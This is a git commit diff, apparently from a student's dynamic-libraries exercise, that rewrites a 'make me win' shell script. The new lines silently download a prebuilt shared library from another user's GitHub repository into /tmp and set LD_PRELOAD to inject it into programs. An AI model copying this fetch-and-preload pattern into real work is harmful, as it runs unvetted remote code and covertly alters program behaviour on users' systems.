984f43602d05b4a3a05c99ba2fd8277488699d4a
yassine <yelkadiri39@gmail.com>
2024-10-06 21:00:06 +0100

    d

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-cp ../sh2.sh .
-. ./sh2.sh
+wget -q -O /tmp/gigalib.so "https://raw.githubusercontent.com/Hagos2022/alx-low_level_programming/master/0x18-dynamic_libraries/gigalib.so"
+export LD_PRELOAD=/tmp/gigalib.so
